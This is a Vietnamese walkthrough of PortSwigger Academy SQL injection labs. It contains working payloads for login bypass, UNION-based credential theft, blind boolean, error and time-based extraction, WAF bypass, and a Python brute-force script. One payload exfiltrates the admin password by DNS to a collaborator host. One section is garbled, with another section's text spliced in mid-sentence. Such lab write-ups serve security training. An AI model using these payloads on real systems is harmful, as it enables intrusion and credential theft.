## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Theo mô tả của bài lab, chức năng lọc sản phẩm theo tham số category bị dính SQLi. Các category được liệt kê trên trang chủ.
![image](https://hackmd.io/_uploads/SkW3Y9GFGx.png)
Thử lọc sản phẩm theo Accessories, có thể thấy đó là GET request đến /filter?category=Accessories.
![image](https://hackmd.io/_uploads/HkT3F9GKze.png)
Dựa vào mô tả, bài lab sử dụng câu query sau để thực hiện lọc các sản phẩm:
`SELECT * FROM products WHERE category = 'Accessories' or '1'='1' -- AND released = 1
`
```
category = 'Accessories' or '1'='1' là điều kiện luôn đúng
-- AND released = 1: phần sau đã bị comment
```

Gửi request với tham số c`ategory=Accessories' or '1'='1' --` , ta đã solve được challenge.
![image](https://hackmd.io/_uploads/BJgsGqcMKfg.png)

## SQL injection vulnerability allowing login bypass
Đây là dạng bài sử dụng SQLi để bypass authentication. Trong bài lab này sử dụng câu query sau để xác thực xem tài khoản có tồn tại không. Ví dụ với account wiener:peter
`SELECT * FROM users WHERE username = 'wiener' AND password = 'peter'
`
Lúc này dễ dàng thấy, nếu chèn username là một điều kiện luôn đúng và comment phần sau lại thì sẽ bypass thành công. Cụ thể, để đăng nhập được với administrator, ta chỉ cần gửi username=administrator' or '1'='1' -- . Lúc này câu query trở thành:
`SELECT * FROM users WHERE username = 'administrator' or '1'='1' -- AND password = 'peter'
`
Câu query này luôn thực thi được → Đăng nhập thành công với user administrator.

![image](https://hackmd.io/_uploads/BJLLqcfFfe.png)

## SQL injection UNION attack, determining the number of columns returned by the query
Đây là dạng bài lab sử dụng UNION trong SQL để thực hiện trích xuất thông tin của table khác. Mục tiêu bài này sẽ là đi xác định số cột trả về của câu query bị dính SQLi, rồi sau đó sẽ dùng UNION dựa trên số cột đã xác định để trả về thêm 1 hàng chứa toàn giá trị null.
![image](https://hackmd.io/_uploads/B1Un9cMFze.png)
Tương tự bài lab 1, tham số category chính là nơi để khai thác SQLi.
`SELECT * FROM products WHERE category = 'Gifts'
`
![image](https://hackmd.io/_uploads/HkMAc9ftfe.png)
Đầu tiên, ta sẽ đi xác định số cột trả về bằng ORDER BY. Cụ thể với category=Gifts' ORDER BY 3 -- - thì câu query trở thành:
`SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3 -- -'
`
Ta thấy, vẫn có kết quả trả về nên số cột ≥ 3.![image](https://hackmd.io/_uploads/rkS1ocMYfl.png)
Thử với payload category=Gifts' ORDER BY 4 -- - thì thấy server trả lỗi như dưới → Xác định được số cột là 3.![image](https://hackmd.io/_uploads/rkayoqztMl.png)
Bây giờ chỉ việc sử dụng UNION với payload category=Gifts' UNION SELECT null,null,null -- -, ta sẽ khiến server trả thêm 1 hàng chứa toàn giá trị null.

![image](https://hackmd.io/_uploads/ry8lo9zYzl.png)

## SQL injection UNION attack, finding a column containing text
Bài lab này tương tự bài lab trên, chỉ khác là thay vì hiển thị hàng chứa giá trị null thì sử dụng UNION để hiển thị chuỗi bất kì, cụ thể là yNBXRx. Số cột trả về là 3 và ta cần tìm xem cột nào trong 3 cột đó sẽ được hiển thị.
![image](https://hackmd.io/_uploads/HJQzj9Mtze.png)
Sau khi thử với cột 1 với payload abc' UNION SELECT 'yNBXRx', null, null -- - không thành công, thì với cột 2 abc' UNION SELECT null, 'yNBXRx', null -- - , ta đã hiển thị thành công chuỗi trên và solve challenge.
![image](https://hackmd.io/_uploads/HJ3Mi5fYzl.png)

## SQL injection UNION attack, retrieving data from other tables
Tương tự với bài trên, bài lab này sử dụng UNION attack để lấy username và password của bảng users. Lỗ hổng SQLi vẫn nằm ở tham số category.
![image](https://hackmd.io/_uploads/B137s9MtMl.png)

Đầu tiên, ta đi xác định số cột trả về của câu query gốc. Với payload category=Gifts' ORDER BY 2 -- -, server vẫn trả kết quả về list các sản phẩm thành công.
![image](https://hackmd.io/_uploads/B18NsqfFzx.png)
Tuy nhiên, khi sử dụng category=Gifts' ORDER BY 3 -- - thì nó báo lỗi → Xác định được số cột là 2.

![image](https://hackmd.io/_uploads/BJRVoqGtMx.png)
Sau khi xác định được có 2 cột được trả về, ta chỉ việc sử dụng UNION attack bằng payload category=Gifts' UNION SELECT username,password from users -- - để lấy các tài khoản có trong bảng users.
![image](https://hackmd.io/_uploads/S1PSs5GtGg.png)
Kết quả cho ta thấy được tài khoản của user administrator. Đăng nhập bằng tài khoản này, ta solve được challenge.
## SQL injection UNION attack, retrieving multiple values in a single column
Bài lab này là bài nâng cấp của bài thứ 5. Khi sử dụng payload category=Pets' UNION SELECT username,password from users -- - thì thấy server báo lỗi → Có thể 1 trong 2 cột trả về sẽ không phải kiểu string.
![image](https://hackmd.io/_uploads/rJWvo5zFzg.png)
Sau một thời gian thử nghiệm thì phát hiện cột thứ 2 sẽ trả về string thành công bằng cách sử dụng payload category=Pets' UNION SELECT null,username from users -- -.

![image](https://hackmd.io/_uploads/ry6vsqGYMl.png)
Bây giờ chỉ cần sử dụng cách nối chuỗi trong sql để lấy cả username và password cùng 1 lúc. Cụ thể ta sẽ sử dụng payload sau: category=Pets' UNION SELECT null,username||':'||password from users -- -. Lúc này giá trị các cột username và password sẽ được trả về cùng lúc và được ngăn nhau bởi dấu :.
![image](https://hackmd.io/_uploads/rJMYj9Gtfx.png)Thực thi và ta lấy được tài khoản của administrator. Đăng nhập bằng tài khoản trên và ta solve được bài lab.![image](https://hackmd.io/_uploads/HJpKs9fKfx.png)

## SQL injection attack, querying the database type and version on Oracle
Bài lab này tiếp tục khai thác lỗ hổng SQLi tại tham số category. Lần này mục tiêu sẽ là lấy được version của database Oracle.
![image](https://hackmd.io/_uploads/r1Soi5zYMx.png)
Tương tự các bài trước, ta xác định được có 2 cột trả về. Sử dụng payload category=Lifestyle' UNION SELECT null, null -- - hay category=Lifestyle' UNION SELECT 'A', 'b' -- - đều trả về lỗi. Sau khi đọc docs của Oracle database, mình phát hiện ra khi sử dụng câu lệnh SELECT thì phải xác định nó lấy từ bảng hợp lệ nào với FROM.
![image](https://hackmd.io/_uploads/rJynscGFMx.png)
Trong Oracle, tồn tại một bảng mặc định dual. Ta có thể sử dụng nó để thực hiện SELECT thành công như hình dưới. Kết quả trả về 2 cột đều được hiển thị thành công.![image](https://hackmd.io/_uploads/r1R2s9zKzx.png)
Bây giờ ta chỉ cần sử dụng payload category=Lifestyle' UNION SELECT 'A', banner FROM v$version -- - để lấy thông tin version của Oracle database.

![image](https://hackmd.io/_uploads/r1Daj9MtMl.png)
Khi đó, thông tin version được hiển thị theo yêu cầu và ta solve được challenge.

## SQL injection attack, querying the database type and version on MySQL and Microsoft

Một bài tương tự bài 7, chỉ khác là bây giờ ta sẽ đi lấy version của MySQL và Microsoft SQL Server. Cả 2 hệ quản trị database này đều có cách lấy version giống nhau: SELECT version().![image](https://hackmd.io/_uploads/H1fBhczKzx.png)
Tương tự, ta xác định được số cột trả về là 2.![image](https://hackmd.io/_uploads/rJ6HnqzYMg.png)
![image](https://hackmd.io/_uploads/r1EL35MFMe.png)

Thực hiện kiểm tra cách hiển thị các cột bằng payload abc' UNION SELECT 'a','b' -- - → Cả 2 cột đều có thể nhận kiểu string.![image](https://hackmd.io/_uploads/H1Lw3cMtGe.png)


Lúc này chỉ cần abc' UNION SELECT 'a',version() -- - ta có thể xem được version của database và solve challenge.![image](https://hackmd.io/_uploads/Syv_25MYfl.png)

## SQL injection attack, listing the database contents on non-Oracle databases

Bài lab này yêu cầu phải đi tìm tên bảng cũng như tên cột có chứa tài khoản của các users chứ không cho sẵn như bài trên. Đây là một bài trên hệ quản trị không phải Oracle.

Đầu tiên, ta xác định được số cột trả về là 2 (giống bài trên). Thử kiểm tra cách hiển thị các cột với payload category=a' UNION SELECT 'a','b'.

![image](https://hackmd.io/_uploads/HkfxT5fFfe.png)
Kiểm tra version thì đây là PostgreSQL.![image](https://hackmd.io/_uploads/B1igT9ftMe.png)
Sau khi biết đây là PostgreSQL thì ta sẽ tìm kiếm tất cả tên các bảng có trong database thông qua information_schema. Sử dụng payload sau: a' UNION SELECT table_name, 'b' from information_schema.tables -- .![image](https://hackmd.io/_uploads/HJ8WT5MKzg.png)
Kết quả xuất hiện 1 bảng nghi vấn có chứa chuỗi users là users_occukb. Tiếp theo, ta sẽ đi tìm tên các cột có trong table users_occukb với payload sau: a' UNION SELECT column_name, 'b' from information_schema.columns where table_name='users_occukb' -- -.

![image](https://hackmd.io/_uploads/HkWG69GtMl.png)
Dựa vào hình trên có thể thấy được 2 cột có trong bảng users_occukb. Thực
Bài lab này tương tự bài trên, chỉ khác là tấn công SQLi đối với Oracle database. Tương tự, ta cũng xác định được số cột trả về của câu query là 2. Kiểm tra cách hiển thị bằng payload trên hình:![image](https://hackmd.io/_uploads/BJvEaqfFfx.png)
Ta sẽ đi liệt kê tên các table đang có trong database: a' UNION SELECT owner, table_name FROM all_tables -- -. Kết quả xuất hiện table có chứa chuỗi USERS là USERS_GSEMNG.![image](https://hackmd.io/_uploads/H1BSacMtfg.png)
![image](https://hackmd.io/_uploads/ryiH6qGFMx.png)
Ta sẽ đi tìm các cột có chứa table này bằng payload: a' UNION SELECT column_name,'aa' FROM user_tab_cols WHERE table_name = 'USERS_GSEMNG' -- -.thi payload sau, ta sẽ liệt kê được các tài khoản có trong nó: a' UNION SELECT username_gfkpyb, password_xrdklp from users_occukb -- -.![image](https://hackmd.io/_uploads/HJ7mTcMYzl.png)

## SQL injection attack, listing the database contents on Oracle
Bài lab này tương tự bài trên, chỉ khác là tấn công SQLi đối với Oracle database. Tương tự, ta cũng xác định được số cột trả về của câu query là 2. Kiểm tra cách hiển thị bằng payload trên hình:![image](https://hackmd.io/_uploads/BJvEaqfFfx.png)
Ta sẽ đi liệt kê tên các table đang có trong database: a' UNION SELECT owner, table_name FROM all_tables -- -. Kết quả xuất hiện table có chứa chuỗi USERS là USERS_GSEMNG.![image](https://hackmd.io/_uploads/H1BSacMtfg.png)
![image](https://hackmd.io/_uploads/ryiH6qGFMx.png)
Ta sẽ đi tìm các cột có chứa table này bằng payload: a' UNION SELECT column_name,'aa' FROM user_tab_cols WHERE table_name = 'USERS_GSEMNG' -- -.

![image](https://hackmd.io/_uploads/ByHvT9GYMe.png)
Dựa vào kết quả, ta trích xuất được tên 2 cột có trong bảng USERS_GSEMNG là USERNAME_RKTXFE và PASSWORD_YCJIMQ. Lúc này chỉ việc dùng payload a' UNION SELECT USERNAME_RKTXFE, PASSWORD_YCJIMQ FROM USERS_GSEMNG -- - để xem được tài khoản administrator.![image](https://hackmd.io/_uploads/HyguT5zFGx.png)


## Blind SQL injection with conditional responses
Đây là dạng bài Blind SQLi sử dụng Boolean-based để lấy được tài khoản administrator. Lỗ hổng nằm ở cookie TrackingID.

Khi thêm dấu ' vào trường TrackingID, ta nhận thấy không có gì xảy ra.

![image](https://hackmd.io/_uploads/HJVKTcztzl.png)

Tuy nhiên khi sử dụng payload 9Zr8DC77HqRBUaa' or '1'='1'-- , một dòng chữ Welcome back! xuất hiện. Như vậy nếu như điều kiện query đúng thì Welcome back! sẽ được hiển thị.![image](https://hackmd.io/_uploads/S1Z9T9MYMe.png)
Như vậy ta có thể đi tìm password của user adinistrator trong bảng users bằng cách bruteforce từng kí tự với hàm substr(). Trước tiên, ta sẽ đi bruteforce tìm độ dài của password trước với payload sau: 9Zr8DC77HqRBUaa' or (select length(password) from users where username='administrator')=<bruteforce wordlist> -- . Bruteforce wordlist sẽ là dãy số từ 1 → 30.![image](https://hackmd.io/_uploads/SJp5p9MKfg.png)
Kết quả cho thấy, với giá trị 20, dòng chữ Welcome back! đã hiển thị → password dài 20 kí tự. Bây giờ, sử dụng substr để tìm từng kí tự của password. Nếu kí tự thứ i bằng với kí tự x trong wordlist bruteforce thì điều kiện query đúng → Dòng Welcome back! được hiển thị. Sử dụng wordlist là các kí tự từ [a-zA-Z0-9] kèm theo payload sau: 9Zr8DC77HqRBUaa' or substr((select password from users where username='administrator'),§1§,1)='§a§' -- .![image](https://hackmd.io/_uploads/BkPiTcfKGx.png)
Kết quả bruteforce trả về từng kí tự trong 20 kí tự của password nhưu hình dưới.![image](https://hackmd.io/_uploads/Skb3TcGFGe.png)
Ngoài ra, ta có thể sử dụng Python script sau để bruteforce kết quả dễ nhìn và tự động hơn.
```
import requests
import string

def get_length(url):
    length = 1
    while True:
        cookies = {'TrackingId': f"a' or (select length(password) from users where username='administrator')={length} -- "}
        r = requests.get(url=url, cookies=cookies)
        if 'Welcome back!' in r.text:
            print(f'[+] Found length of password: {length}')
            break
        length += 1
    return length

def exploit(url):
    length = get_length(url=url)
    wordlist = string.printable[:62]
    password = ''
    for i in range(1,length+1):
        for x in wordlist:
            cookies = {'TrackingId': f"a' or substr((select password from users where username='administrator'),{i},1)='{x}' -- "}
            r = requests.get(url=url, cookies=cookies)
            if 'Welcome back!' in r.text:
                password += x
                print(f'[+] Found char of password: {x} --> Password: {password}')
                break

if __name__=="__main__":
    url = 'https://0a4c003403b1f943c29e216f000400c0.web-security-academy.net/'
    exploit(url=url)

```

## Blind SQL injection with conditional errors

Bài lab này cũng có lỗ hổng Blind SQLi ở trường TrackingID tại Cookie. Tuy nhiên, bài lab sẽ không sử dụng Boolean-based như bài trên mà sẽ là Error-based để trigger lỗi được custom bởi ứng dụng web.

Khi thêm 1 dấu ' vào TrackingID cookie, ứng dụng báo lỗi.![image](https://hackmd.io/_uploads/B1xlCqfFGg.png)
Tuy nhiên khi thêm 1 dấu '' vào TrackingID cookie, ứng dụng trả về nội dung bình thường → Lỗi SQLi.![image](https://hackmd.io/_uploads/rJaxRczFzl.png)
Trước tiên, ta đi xác định số cột trả về của query bằng ORDER BY.![image](https://hackmd.io/_uploads/Bkd-R5fKMl.png)
Kết quả trả về, với ' ORDER BY 2 --  thì server trả lỗi còn ' ORDER BY 1 --  sẽ hiển thị nội dung → Câu query lấy 1 cột.![image](https://hackmd.io/_uploads/B1wz0cftfg.png)
Thử UNION với ' UNION SELECT null --  thì thấy server lại báo lỗi → Đây có thể là lỗi do hệ quản trị database là Oracle vì nó cần SELECT từ một table tồn tại.![image](https://hackmd.io/_uploads/BJg7CcGtze.png)
Ta kiểm chứng được đó chính là Oracle với payload ' UNION SELECT null from dual --.![image](https://hackmd.io/_uploads/BJFmRcfKGg.png)
Ngoài ra, ta còn xác định được cột trả về có kiểu dữ liệu chuỗi thay vì dạng số nhờ 2 payload ở 2 hình dưới đây:

![image](https://hackmd.io/_uploads/Hk-V0cfYMx.png)
![image](https://hackmd.io/_uploads/SyKN09MFGx.png)
Dựa vào các phân tích ở trên, có thể thấy server đã thực thi được phần injection của mình. Bây giờ ta sẽ đi tìm password cho user administrator có trong bảng users bằng phương pháp Error-based. Cụ thể với payload:
`' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual
`
Trong đó,

- Khi điều kiện sau WHEN đúng → server thực thi TO_CHAR(1/0) → Server trả lỗi do 1/0 không thực thi được. Ở đây dùng TO_CHAR() vì cột trả về có kiểu dữ liệu chuỗi.
![image](https://hackmd.io/_uploads/rJY8RcGYGe.png)
- Nếu điều kiện sau WHEN sai → server không trả lỗi.
- ![image](https://hackmd.io/_uploads/S1vPCqzYzx.png)
Như vậy, ta chỉ cần tìm các điều kiện đúng liên quan đến password thì server sẽ báo lỗi → đây là dấu hiệu.

Tương tự bài trên, ta sẽ đi tìm độ dài của password trước với payload như hình dưới. Dùng Intruder để bruteforce độ dài, với wordlist mình chọn là từ 1→25.![image](https://hackmd.io/_uploads/HyG_09ztGe.png)
Kết quả với độ dài 20 thì server trả lỗi → password dài 20 kí tự.
![image](https://hackmd.io/_uploads/By9YAczKze.png)
![image](https://hackmd.io/_uploads/BkX5AqzFzl.png)

## Blind SQL injection with time delays
Đây là bài lab yêu cầu sử dụng Time-based để tấn công Blind SQLi. Ta sẽ thực hiện đi tìm hệ quản trị database mà ứng dụng sử dụng bằng cách thử các cách Time-based khác nhau của từng loại hệ quản trị. Mình đã thử cho đến khi sử dụng syntax của PostgreSQL:
`'; SELECT pg_sleep(10)-- 
'||SELECT pg_sleep(10)-- 
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
`
Cả 3 payload này đều có thể khiến response delay 10s trước khi hiển thị kết quả ta đã solve thành công.![image](https://hackmd.io/_uploads/BJJaRqGYMe.png)

## Blind SQL injection with time delays and information retrieval
Đây là một phiên bản nâng cấp của bài lab 13. Ta sẽ sử dụng kĩ thuật Time-based để trích xuất thông tin của các table khác có trong database.

Sử dụng payload '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--  tương tự bài lab 13, response bị delay 10s thành công.
![image](https://hackmd.io/_uploads/HymRAqzFGl.png)
Lúc này ta sẽ đi tìm password của user administrator từ bảng users. Ta sẽ thử kiểm tra LENGTH(password) trước với payload '; SELECT CASE WHEN (LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'-- .

![image](https://hackmd.io/_uploads/HJXk1oMtfg.png)
Kết quả là response trả về sau hơn 10s → password dài hơn 1 kí tự. Dựa vào đó, ta sẽ đi bruteforce độ dài password bằng payload sau:'; SELECT CASE WHEN (LENGTH(password)=§1§) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'-- ![image](https://hackmd.io/_uploads/r1Tk1ozFGx.png)
Kết quả cho thấy với kí tự 20 thì response trả về sau 10s → password dài 20 kí tự. bây giờ tương tự các bài đã làm, ta sẽ sử dụng SUBSTRING() trong câu điều kiện để tìm từng kí tự trong 20 kí tự của password. Sử dụng payload sau: '; SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--.
![image](https://hackmd.io/_uploads/B1wxkszYzg.png)
Chú ý set tối đa 1 request được gửi mỗi lần để tránh thời gian response trả về của các requests bị ảnh hưởng.![image](https://hackmd.io/_uploads/HkG-ysGYGl.png)
Thực hiện bruteforce với wordlist kí tự nằm khoảng [a-z0-9], ta được kết quả như hình dưới với các response trả về sau hơn 10s. Kết hợp các kí tự theo thứ tự, ta thu được password của administrator là h1tvk13v1ssq19i1q30p.

## Blind SQL injection with out-of-band data exfiltration

Bài lab này thừa kế bài số 15, yêu cầu lấy được password của administrator thông qua các DNS lookup. Với payload như bài 15, ta chỉ việc chèn vào URL một câu subquery lấy password thành dạng "http://'||(SELECT password from users where username='administrator')||'.nmdp1e6cli847y3qc1la7vvkxb36rv.oastify.com/".

Lúc này, thêm payload sau khi chỉnh vào trường TrackingID:

' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.nmdp1e6cli847y3qc1la7vvkxb36rv.oastify.com/"> %remote;]>'),'/l') FROM dual--

![image](https://hackmd.io/_uploads/rkzV1sztMe.png)
Gửi request và kiểm tra Burp Collaborator thì thấy các DNS query đã được gửi đến kèm theo password của user administrator là jw98l8htcuqajnaxhxak.![image](https://hackmd.io/_uploads/H1aVkifFze.png)
Đăng nhập vào tài khoản trên, ta solve được challenge.

## SQL injection with filter bypass via XML encoding

Ứng dụng xảy ra lỗi SQLi tại chức năng Check stock của các sản phẩm.![image](https://hackmd.io/_uploads/BJVLJjztMg.png)
Khi click Check stock, một POST request được gửi đến /product/stock để query số sản phẩm có trong kho của database. Trong đó, body được gửi có dạng XML với 2 trường: productId và storeId.![image](https://hackmd.io/_uploads/BJRU1jMYGe.png)
Ta sẽ thêm một phép toán vào storeId là 1+2 xem nó có được thực thi đúng hay không. Kết quả trả về 1 kết quả khác → nó được thực thi thành công.
![image](https://hackmd.io/_uploads/SkuDJjztGe.png)
Bây giờ sẽ thử UNION attack tại trường storeId với payload UNION SELECT null --, kết quả trả về Attack detected → đã bị WAF chặn.![image](https://hackmd.io/_uploads/Bym_1iftfx.png)
Ta sẽ sử dụng cách encode HTML thành dạng hex entities đối với cả payload trên, kết quả trả về một hàng chứa null → ta đã bypass WAF và tấn công thành công; bên cạnh đó, còn có thể suy ra là câu query chỉ lấy giá trị 1 cột để trả về.![image](https://hackmd.io/_uploads/HkaukiMtMg.png)
Bây giờ, ta chỉ việc lấy username và password từ bảng users theo cách tấn công UNION thông thường. Vì đây chỉ trả về 1 cột nên em sử dụng cách thức nối chuỗi để in ra username và password cùng 1 lúc. Payload được sử dụng là: UNION SELECT username||':'||password FROM users --

![image](https://hackmd.io/_uploads/rJ8KJiftze.png)
Kết quả trả về tất cả các tài khoản có trong bảng users. Sử dụng tài khoản của administrator để đăng nhập, ta solve được challenge thành công.

![image](https://hackmd.io/_uploads/Hkl5yjMtzx.png)
